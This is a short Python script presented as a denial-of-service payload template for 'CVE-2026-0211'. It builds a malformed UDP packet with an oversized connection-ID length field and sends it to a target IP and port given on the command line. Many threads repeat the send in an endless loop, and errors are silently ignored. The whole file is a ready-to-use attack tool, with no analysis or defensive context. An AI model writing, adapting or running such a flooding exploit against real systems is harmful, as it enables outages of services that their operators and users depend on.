#!/usr/bin/env python3
import socket
import threading
import time
import sys

# CVE-2026-0211 DoS Payload Template
MALFORMED_DCID_LEN = b'\xff'
PAYLOAD = b'\xc3\x00\x00\x00\x01' + MALFORMED_DCID_LEN + (b'A' * 255) + b'\x00'

def dos_worker(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(PAYLOAD, (ip, port))
        except:
            pass

def start_dos(target_ip, target_port, thread_count):
    print(f"[*] Starting CVE-2026-0211 DoS against {target_ip}:{target_port}")
    print(f"[*] Spawning {thread_count} worker threads...")
    
    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=dos_worker, args=(target_ip, target_port))
        t.daemon = True
        t.start()
        threads.append(t)
        
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping DoS attack...")
        sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 03_dos.py <target_ip> <target_port> <threads>")
        sys.exit(1)
        
    start_dos(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
